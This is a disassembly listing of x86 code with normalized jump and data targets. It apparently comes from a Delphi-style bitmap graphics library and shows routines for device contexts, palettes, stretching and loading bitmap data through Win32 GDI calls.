mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42984c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426ae8
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428da4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4298b4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_42a0b0
mov eax [ esi + 0x28 ]
call sub_428da8
mov eax [ esi + 0x2c ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4298f0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4299a8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42a380
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_428da4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428da8
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418f24
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4299e0
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a0b0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429a6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_4295dc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_428f78
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429a74
mov eax [ ebp - 0x8 ]
call sub_423714
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a9c
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_429aa0
push ebx
mov ebx eax
mov eax ebx
call sub_429d94
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d4f0
pop ebx
retn
sub_429ad0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41b07c
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42a0b0
lea eax [ ebx + 0x2c ]
call sub_40d4f0
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42a380
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_429b44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425644
mov eax ebx
call sub_42a1c0
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_429ed0
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_429d80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call SetStretchBltMode
mov eax ebx
call sub_429e14
mov dl [ r-xdata ]
call sub_425644
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_42a160
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_429e14
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d87
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_429d15
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_429e14
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_429d94
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42a0c0
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4299e0
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4258c0
sub_429e14
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42a0c0
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428bb0
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_429aa0
sub_429e5c
push ebx
mov ebx eax
mov eax ebx
call sub_42a0b0
mov eax ebx
call sub_42a0c0
mov edx ebx
mov eax ebx
call sub_429aa0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_429e80
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_429f00
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_429e80
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_429f84
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_429aa0
mov eax [ ebx + 0x28 ]
add eax 0x18
mov ebp eax
lea esi [ eax + 0x18 ]
test edi edi
jl r-xdata
mov eax [ rw-data ]
call sub_425818
cmp edi [ ebp + 0x8 ]
jl r-xdata
movzx edx [ esi + 0xe ]
mov ecx 0x20
mov eax [ esi + 0x4 ]
call sub_425af8
imul edi
add eax [ ebp + 0x14 ]
mov ebx eax
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub eax edi
dec eax
mov edi eax
mov eax ebx
call sub_42a03c
call GdiFlush
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
sub_429fec
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423fe4
mov eax ebx
call sub_429ed0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_429e14
xor edx edx
pop ecx
call sub_4254d8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_42a03c
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_42a1c0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_428f78
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42a0c0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41b018
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42a143
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_42a160
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42a0b0
mov eax ebx
call sub_42a0c0
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_429fec
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_429640
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_428b34
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42a1c0
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_426058
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_428b34
push 0x0
call GetDC
call sub_425968
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_42a278
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_425830
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4299e0
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42a0b0
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_42a2fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41aff8
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42aa10
pop esi
pop ebx
retn
sub_42a320
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_41b8ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a374
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a4a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a37b
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_42a380
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a407
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_42a467
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428da8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_428da4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a46e
push rw-data
call LeaveCriticalSection
retn
sub_42a480
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42aa10
pop edx
pop edi
pop esi
pop ebx
retn
sub_42a4a8
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026cc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_42a9c5
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42a998
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cbc
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425848
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41b294
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402cbc
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b224
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_425ad8
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425af8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41b224
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_425968
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42a913
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425da0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026cc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42a87b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b224
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42a84f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426058
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cf94
call sub_425848
jmp r-xdata
xor eax eax
push ebp
push sub_42a8e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
